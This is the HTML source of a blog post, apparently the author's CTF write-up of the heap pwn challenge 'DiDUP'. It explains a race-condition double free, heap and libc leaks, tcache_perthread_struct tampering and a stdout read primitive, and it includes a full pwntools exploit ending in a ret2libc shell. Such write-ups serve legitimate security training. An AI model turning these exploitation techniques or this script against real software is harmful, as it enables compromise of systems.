@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CTE24 - DiDUP | leo_something</title>
+<meta name="keywords" content="pwn, heap, race condition">
+<meta name="description" content="This is an hard pwn challenge I wrote for Compete Against TeamEurope, this CTF was part of the training for ECSC2024. The vulnerability is a double-free triggerable through a race condition. No bruteforce is needed.">
+<meta name="author" content="leo_something">
+<link rel="canonical" href="http://leo1.cc:5555/posts/writeups/cte24-didup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c2131417d0b88f5928cdb2549da0d09bb391dae4fb3114012aa1349b07d4a44.css" integrity="sha256-DCExQX0LiPWSjNslSdoNCbs5Ha5PsxFAEqoTSbB9SkQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc:5555/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc:5555/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc:5555/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc:5555/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc:5555/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc:5555/posts/writeups/cte24-didup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://leo1.cc:5555/posts/writeups/cte24-didup/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="CTE24 - DiDUP">
+  <meta property="og:description" content="This is an hard pwn challenge I wrote for Compete Against TeamEurope, this CTF was part of the training for ECSC2024. The vulnerability is a double-free triggerable through a race condition. No bruteforce is needed.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-16T12:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-16T12:00:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Heap">
+    <meta property="article:tag" content="Race Condition">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTE24 - DiDUP">
+<meta name="twitter:description" content="This is an hard pwn challenge I wrote for Compete Against TeamEurope, this CTF was part of the training for ECSC2024. The vulnerability is a double-free triggerable through a race condition. No bruteforce is needed.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc:5555/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTE24 - DiDUP",
+      "item": "http://leo1.cc:5555/posts/writeups/cte24-didup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTE24 - DiDUP",
+  "name": "CTE24 - DiDUP",
+  "description": "This is an hard pwn challenge I wrote for Compete Against TeamEurope, this CTF was part of the training for ECSC2024. The vulnerability is a double-free triggerable through a race condition. No bruteforce is needed.",
+  "keywords": [
+    "pwn", "heap", "race condition"
+  ],
+  "articleBody": "Download Challenge ↓\nOverview DidUP? Sounds more like DiDUP to me.\nDISCLAIMER: for evil professors only!\nnc localhost 1337\nP.S: The real DidUP is out of scope, if you manage to pwn that please pay my school fees :)\nThe challenge file is a single C binary compiled with all protections.\nReversing the binary we can identify 4 main functionalities:\nadd_mark: allows the user to allocate a chunk (adding it to a list) and write a mark (int) and a description (string) into it remove_mark: frees the chunk containing the mark and removes it from the list change_mark: change the data inside a previosly allocated chunk save_mark: spawns a thread and makes a post request to an arbitrary endpoint, sending the mark as payload. It also removes the chunk. Solution Race condition The function save_mark seems suspicious because the call to free is made before the post request, but the pointer is removed from the list after it. This can trigger a race condition that can lead to a double free!\nAs we can choose the url for the request, the race condition can have an arbitrary window, we just need to setup an endpoint with a sleep.\n\u003c?php if ($_SERVER['REQUEST_METHOD'] === 'POST') { $body = file_get_contents('php://input'); $logFile = 'bodies.txt'; file_put_contents($logFile, $body . PHP_EOL, FILE_APPEND); // stores the body of the request sleep(3); // just wait (arb window) } else { echo \"Make a POST request\"; } ?\u003e this is the simple endpoint I made. Please webbers, have mercy\nLeak heap Saving a file two times in a row allows us to leak the heap.\nThis can be done because, after the first free, the saved mark becomes the “safe-linked” chunk-\u003efd and if the chunk is the last in the linked list then chunk-\u003efd = heap\u003e\u003e12. We just need to guess the upper nibble of the heap, which is usually 0x5 or 0x6.\nIn short:\nadd chunk save chunk (start race) change chunk tcache-key sleep for 1 sec (ensure requests arrive in the right order) save chunk again (leak heap) sleep for 2 sec (end race) Note that we need to change the tcache-key (second qword of the chunk) before saving the chunk a second time, otherwise we get a SIGABRT.\nAnd now let’s have some fun with feng shui!\nPartial libc leak With some allocations we can get a chunk into unsortedbins and leak the lower 4 bytes of libc using save_mark.\nPlaying with tcache_perthread_struct At this point the easiest way of arbitrary writing is to tamper with the tcache_perthread_struct, as we avoid messing with safe linking, but as we don’t have a full libc leak we need to do some magic.\nThe idea is to free a chunk into unsortedbins so as to have a pointer to main_arena as the first entry in the 0x40 tcache linked list.\nTo achieve this we need to move to smallbins the unsortedbin that we used to partial-leak libc, otherwise freeing another big chunk won’t give us a pointer to libc. To do this we need to allocate a bunch of chunks.\nLibc-leak method 1: stdout as read primitive Once we have our pointer to main_arena as the first entry in 0x40 tcache we can partial override and make it an _IO_2_1_stdout_’s pointer. Now we can allocate a chunk over stdout and partial override _IO_write_base to dump some bytes and fully leak libc (note that buffering is disabled for sdtout, so the buffer pointers in the file struct point inside the struct itself).\\\nThis tecnique is well explained by nobodyisnobody on his github.\nLibc-leak method 2: abuse safe-linking Another way of leaking libc consists in partial overriding the main_arena’s pointer to make it point to a writable NULL region of libc.\nAllocating that chunk would trigger safe-linking (if the number of chunks in the 0x40 tcache is greater than 0).\nWe are now in the same situation as when we leaked the heap: we can use the save_mark functionality to leak libc\u003e\u003e12 and guess the upper nibble (0x7).\nSpawning a shell Once we have leaked libc there are different paths one can take:\nleak environ overriding _IO_2_1_stdout_ a second time and then build a ROP chain on the stack of the add_mark function\nAngry-FSROP on stdout\nlibc GOT override using a onegadget (not tested)\nlibc GOT override to stack pivot and ROP (basically this tecnique)\nExploit #!/usr/bin/env python3 from pwn import * import time import requests exe = ELF(\"./build/didup_patched\") # patched libc = ELF(\"./libs/libc.so.6\") context.binary = exe WEBHOOK = \"http://your.webhook\".encode() gdbscript = \\ \"\"\" set follow-fork-mode parent set resolve-heap-via-heuristic force \"\"\" def conn(): if args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript) elif args.REMOTE: r = remote(\"localhost\", 1337) else: r = process([exe.path]) return r r = conn() def add(idx, mark, desc): r.sendlineafter(b\"\u003e\", b\"1\") r.sendlineafter(b\"\u003e\", str(idx).encode()) if type(mark) == bytes: r.sendlineafter(b\":\", mark) else: r.sendlineafter(b\":\", str(mark).encode()) if desc != b\"\": r.sendafter(b\":\", desc) def remove(idx): r.sendlineafter(b\"\u003e\", b\"2\") r.sendlineafter(b\"\u003e\", str(idx).encode()) def save(idx, url): r.sendlineafter(b\"\u003e\", b\"4\") r.sendlineafter(b\"\u003e\", str(idx).encode()) r.sendlineafter(b\":\", url) def change(idx, mark, desc): r.sendlineafter(b\"\u003e\", b\"3\") r.sendlineafter(b\"\u003e\", str(idx).encode()) if type(mark) == bytes: r.sendlineafter(b\":\", mark) else: r.sendlineafter(b\":\", str(mark).encode()) if desc != b\"\": r.sendafter(b\":\", desc) # given a pointer generate mark and description def gen_mark_desc(ptr): mark = ptr \u0026 0xffffffff desc = p32((ptr \u0026 (0xffff\u003c\u003c32)) \u003e\u003e 32) return mark, desc # calculate safe-linked pointer def calculate_P1(P, L): L12 = L \u003e\u003e 12 P = P.to_bytes(8, \"big\") L12 = L12.to_bytes(8, \"big\") return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) def main(): if args.REMOTE: print(r.recvuntil(b\"Result\")) r.sendlineafter(b\":\", input(\"Result: \").encode()) # race condition to tcache-dup \u0026 leak heap add(0, 1, b\"\") # -- start race -- save(0, WEBHOOK) # change tcache-key (use \"-\" to keep chunk-\u003efd untouched) change(0, b\"-\", b\"asdasdasdasdasd\") time.sleep(1) # ensure requests arrive in the right order save(0, WEBHOOK) # leak heap time.sleep(2) # -- end race -- # -- guess upper 4 bits of heap -- leak = int(requests.get(WEBHOOK.decode()+\"bodies.txt\").text.split(\"\\n\")[-2].split(\"mark=\")[1]) heap = 0 if leak \u003c 0: heap = (0x100000000 + leak) else: heap = leak heap = heap \u003c\u003c 12 # log.info(f\"partial heap: {hex(heap)}\") # h_nibble = int(input(\"Guess the upper nibble: 0x\").rjust(2, \"0\"), 16) # usually 0x55 \u003c= (heap\u003e\u003e40) \u003c= 0x65 if (heap\u003e\u003e40) \u003e 5: h_nibble = 5 else: h_nibble = 6 heap = (h_nibble\u003c\u003c44) + heap log.warning(f\"heap: {hex(heap)}\") # ------------------------------- # undo tcache dup add(0, 1, b\"\") add(0, 1, b\"\") # ====================================================== # create a big chunk and put it in unsortedbins # allocate from it a chunk # doing so we can partially leak libc without corrupting unsortedbins # then we need to consume the unsortedbin # in this way the thread can't allocate from it (avoid heap mess and crash) # increase tcache count for i in range(2, 10): add(i, 1, b\"\") for i in range(6, 10): remove(i) # race to tcache-dup add(4, 1, b\"\") save(4, WEBHOOK) change(4, 6, b\"asdasdasd\") remove(4) time.sleep(4) # allocate a chunk above tcache_perthread_struct # this will be used to enlarge the chunk under it add(4, 1, b\"\") tcache_metadata = calculate_P1(heap+0x80, heap+0x6c0) mark, desc = gen_mark_desc(tcache_metadata) change(4, mark, desc) add(4, 1, b\"\") # allocate a chunk and one above it to change its size payload = p32(0) + p64(0)*3 + p64(heap+0x430) add(4, 6, payload) # chunk above tcache_perthread_struct add(8, 1, b\"\") # small chunk to overlap and enlarge the one under it payload = p32(0) + p64(0)*3 + p64(heap+0x410) change(4, 6, payload) # enlarge payload = p32(0) + p64(0)*2 + p64(0x441) add(9, 6, payload) # put big chunk in unsortedbins remove(8) # add chunk from the one in unsortedbins (now we have 2 chunks pointing to libc) add(0, 1, b\"\") # we can save (free) one of them to leak 4 bytes of libc save(0, WEBHOOK) time.sleep(4) leak = int(requests.get(WEBHOOK.decode()+\"bodies.txt\").text.split(\"\\n\")[-2].split(\"mark=\")[1]) partial_libc = 0 if leak \u003c 0: partial_libc = (0x100000000 + leak) else: partial_libc = leak log.warning(f\"partial libc: {hex(partial_libc)}\") # -- consume unsortedbin -- for _ in range(10): add(0, 1, b\"\") for i in range(3): add(i, 1, b\"\") # add entries to 0x40 tcache for i in range(3): remove(i) # ------------------------- # ====================================================== # create a big chunk over tcache_perthread_struct # and put it in unsorted bin # now we have a libc pointer as first entry in 0x40 tcache # then partial override that ptr to make it point to stdout # allocate a chunk precisely over 0x40 tcache entry in tcache_perthread_struct # it's size will be changed by the chunk above payload = p32(0) + p64(0)*3 + p64(heap+0xa0) change(4, 6, payload) add(2, 1, b\"\") # enlarge change(4, 6, p32(0)+flat(0,0,0x4f1)) # free it (to unsortedbins) # to have a libc ptr as first entry on 0x40 tcache remove(2) # calulate partial stdout from leaked libc bytes partial_stdout = (partial_libc \u0026 0xfffff000) + 0x780 # partial override libc address to allocate over stdout payload = p32(0)+flat(0,0,0x4b1)+p32(partial_stdout) change(4, 6, payload) # ====================================================== add(5, 1, b\"\") # chunk over stdout # partial override _IO_write_base to leak libc mark = 0xfbad1887 desc = p32(0) + p64(0)*3 + p32(partial_stdout-0x100) change(5, mark, desc) r.recv() libc.address = u64(r.recv(8)) - 0x21a6a0 log.warning(f\"libc: {hex(libc.address)}\") # ====================================================== # leak environ abusing stdout as read primitive mark = 0xfbad1887 # _IO_write_base = _IO_read_end = environ # _IO_write_ptr = environ+0x100 desc = p32(0) + p64(0) + p64(libc.sym.environ) + p64(0) + p64(libc.sym.environ) + p64(libc.sym.environ+0x100) change(5, mark, desc) r.recv() stack = u64(r.recv(8)) - 0x148 log.warning(f\"stack: {hex(stack)}\") # ====================================================== # change tcache metadata to allocate over retaddr of add_mark function # then write a ret2libc on the stack # change tcache_perthread_struct using previously allocated chunk payload = p32(0)+flat(0,0,0x511)+p64(stack) change(4, 6, payload) # ret2libc on the stack POP_RDI_RET = libc.address + 0x2a3e5 RET = libc.address + 0xf41c9 BINSH = libc.address + 0x1d8698 ret2libc = p32(0) + flat(POP_RDI_RET, BINSH, RET, libc.sym.system) add(0, 6, ret2libc) # ====================================================== log.success(f\"pwned :)\") r.sendline(b\"cat flag\") r.recv() flag = r.recvline().decode().rstrip(\"\\n\") print(flag) # r.interactive() if __name__ == \"__main__\": main() ",
+  "wordCount" : "1609",
+  "inLanguage": "en",
+  "datePublished": "2024-09-16T12:00:00Z",
+  "dateModified": "2024-09-16T12:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "leo_something"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc:5555/posts/writeups/cte24-didup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc:5555/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc:5555/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CTE24 - DiDUP
+    </h1>
+    <div class="post-meta"><span title='2024-09-16 12:00:00 +0000 UTC'>September 16, 2024</span>&nbsp;·&nbsp;leo_something
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/pwn" class="custom-tag">
+        pwn
+      </a>
+      
+      <a href="/tags/heap" class="custom-tag">
+        heap
+      </a>
+      
+      <a href="/tags/race-condition" class="custom-tag">
+        race condition
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#solution" aria-label="Solution">Solution</a><ul>
+                        
+                <li>
+                    <a href="#race-condition" aria-label="Race condition">Race condition</a></li>
+                <li>
+                    <a href="#leak-heap" aria-label="Leak heap">Leak heap</a></li>
+                <li>
+                    <a href="#partial-libc-leak" aria-label="Partial libc leak">Partial libc leak</a></li>
+                <li>
+                    <a href="#playing-with-tcache_perthread_struct" aria-label="Playing with tcache_perthread_struct">Playing with tcache_perthread_struct</a></li>
+                <li>
+                    <a href="#libc-leak-method-1-stdout-as-read-primitive" aria-label="Libc-leak method 1: stdout as read primitive">Libc-leak method 1: stdout as read primitive</a></li>
+                <li>
+                    <a href="#libc-leak-method-2-abuse-safe-linking" aria-label="Libc-leak method 2: abuse safe-linking">Libc-leak method 2: abuse safe-linking</a></li>
+                <li>
+                    <a href="#spawning-a-shell" aria-label="Spawning a shell">Spawning a shell</a></li></ul>
+                </li>
+                <li>
+                    <a href="#exploit" aria-label="Exploit">Exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><a href="didup.zip" class="custom-button">Download Challenge ↓</a></p>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<blockquote>
+<p><a href="https://www.portaleargo.it">DidUP?</a> Sounds more like DiDUP to me.</p>
+<p><strong>DISCLAIMER</strong>: for evil professors only!</p>
+<p><code>nc localhost 1337</code></p>
+<p><strong>P.S</strong>: The <a href="https://www.portaleargo.it">real DidUP</a> is out of scope, if you manage to pwn that please pay my school fees :)</p>
+</blockquote>
+<p>The challenge file is a single C binary compiled with all protections.</p>
+<p><img alt="checksec" loading="lazy" src="/posts/writeups/cte24-didup/checksec.png"></p>
+<p>Reversing the binary we can identify 4 main functionalities:</p>
+<ul>
+<li><code>add_mark</code>: allows the user to allocate a chunk (adding it to a list) and write a mark (int) and a description (string) into it</li>
+<li><code>remove_mark</code>: frees the chunk containing the mark and removes it from the list</li>
+<li><code>change_mark</code>: change the data inside a previosly allocated chunk</li>
+<li><code>save_mark</code>: spawns a thread and makes a post request to an arbitrary endpoint, sending the mark as payload. It also removes the chunk.</li>
+</ul>
+<h2 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h2>
+<h3 id="race-condition">Race condition<a hidden class="anchor" aria-hidden="true" href="#race-condition">#</a></h3>
+<p>The function <code>save_mark</code> seems suspicious because the call to free is made before the post request, but the pointer is removed from the list after it. This can trigger a race condition that can lead to a double free!<br>
+As we can choose the url for the request, the race condition can have an arbitrary window, we just need to setup an endpoint with a sleep.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+</span></span><span style="display:flex;"><span>    $body <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
+</span></span><span style="display:flex;"><span>    $logFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bodies.txt&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">file_put_contents</span>($logFile, $body <span style="color:#f92672">.</span> <span style="color:#a6e22e">PHP_EOL</span>, <span style="color:#a6e22e">FILE_APPEND</span>); <span style="color:#75715e">// stores the body of the request
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">3</span>); <span style="color:#75715e">// just wait (arb window)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Make a POST request&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><em>this is the simple endpoint I made. Please webbers, have mercy</em></p>
+<h3 id="leak-heap">Leak heap<a hidden class="anchor" aria-hidden="true" href="#leak-heap">#</a></h3>
+<p>Saving a file two times in a row allows us to leak the heap.<br>
+This can be done because, after the first free, the saved mark becomes the &ldquo;safe-linked&rdquo; <code>chunk-&gt;fd</code> and if the chunk is the last in the linked list then <code>chunk-&gt;fd = heap&gt;&gt;12</code>.
+We just need to guess the upper nibble of the heap, which is usually 0x5 or 0x6.</p>
+<p>In short:</p>
+<ol>
+<li>add chunk</li>
+<li>save chunk (start race)</li>
+<li>change chunk tcache-key</li>
+<li>sleep for 1 sec (ensure requests arrive in the right order)</li>
+<li>save chunk again (leak heap)</li>
+<li>sleep for 2 sec (end race)</li>
+</ol>
+<blockquote>
+<p>Note that we need to change the tcache-key (second qword of the chunk) before saving the chunk a second time, otherwise we get a SIGABRT.</p>
+</blockquote>
+<p>And now let&rsquo;s have some fun with feng shui!</p>
+<h3 id="partial-libc-leak">Partial libc leak<a hidden class="anchor" aria-hidden="true" href="#partial-libc-leak">#</a></h3>
+<p>With some allocations we can get a chunk into unsortedbins and leak the lower 4 bytes of libc using <code>save_mark</code>.</p>
+<p><img alt="heap partial-lib-leak" loading="lazy" src="/posts/writeups/cte24-didup/heap_partial-libc-leak.png"></p>
+<h3 id="playing-with-tcache_perthread_struct">Playing with tcache_perthread_struct<a hidden class="anchor" aria-hidden="true" href="#playing-with-tcache_perthread_struct">#</a></h3>
+<p>At this point the easiest way of arbitrary writing is to tamper with the <code>tcache_perthread_struct</code>, as we avoid messing with safe linking, but as we don&rsquo;t have a full libc leak we need to do some magic.</p>
+<p>The idea is to free a chunk into unsortedbins so as to have a pointer to <code>main_arena</code> as the first entry in the 0x40 tcache linked list.<br>
+To achieve this we need to move to smallbins the unsortedbin that we used to partial-leak libc, otherwise freeing another big chunk won&rsquo;t give us a pointer to libc. To do this we need to allocate a bunch of chunks.</p>
+<p><img alt="bins main-arena-tcache" loading="lazy" src="/posts/writeups/cte24-didup/bins_main-arena-tcache.png"></p>
+<h3 id="libc-leak-method-1-stdout-as-read-primitive">Libc-leak method 1: stdout as read primitive<a hidden class="anchor" aria-hidden="true" href="#libc-leak-method-1-stdout-as-read-primitive">#</a></h3>
+<p>Once we have our pointer to <code>main_arena</code> as the first entry in 0x40 tcache we can partial override and make it an <code>_IO_2_1_stdout_</code>&rsquo;s pointer.
+Now we can allocate a chunk over stdout and partial override <code>_IO_write_base</code> to dump some bytes and fully leak libc (note that buffering is disabled for sdtout, so the buffer pointers in the file struct point inside the struct itself).\</p>
+<blockquote>
+<p>This tecnique is well explained by <code>nobodyisnobody</code> on <a href="https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive">his github</a>.</p>
+</blockquote>
+<h3 id="libc-leak-method-2-abuse-safe-linking">Libc-leak method 2: abuse safe-linking<a hidden class="anchor" aria-hidden="true" href="#libc-leak-method-2-abuse-safe-linking">#</a></h3>
+<p>Another way of leaking libc consists in partial overriding the <code>main_arena</code>&rsquo;s pointer to make it point to a writable NULL region of libc.<br>
+Allocating that chunk would trigger safe-linking (if the number of chunks in the 0x40 tcache is greater than 0).<br>
+We are now in the same situation as when we leaked the heap: we can use the <code>save_mark</code> functionality to leak <code>libc&gt;&gt;12</code> and guess the upper nibble (0x7).</p>
+<h3 id="spawning-a-shell">Spawning a shell<a hidden class="anchor" aria-hidden="true" href="#spawning-a-shell">#</a></h3>
+<p>Once we have leaked libc there are different paths one can take:</p>
+<ol>
+<li>
+<p>leak <code>environ</code> overriding <code>_IO_2_1_stdout_</code> a second time and then build a ROP chain on the stack of the <code>add_mark</code> function</p>
+</li>
+<li>
+<p>Angry-FSROP on stdout</p>
+</li>
+<li>
+<p>libc GOT override using a onegadget (not tested)</p>
+</li>
+<li>
+<p>libc GOT override to stack pivot and ROP (basically <a href="https://github.com/n132/Libc-GOT-Hijacking">this tecnique</a>)</p>
+</li>
+</ol>
+<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./build/didup_patched&#34;</span>) <span style="color:#75715e"># patched</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libs/libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>WEBHOOK <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://your.webhook&#34;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">set follow-fork-mode parent
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">set resolve-heap-via-heuristic force
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path], gdbscript<span style="color:#f92672">=</span>gdbscript)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, mark, desc):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> type(mark) <span style="color:#f92672">==</span> bytes:
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, mark)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
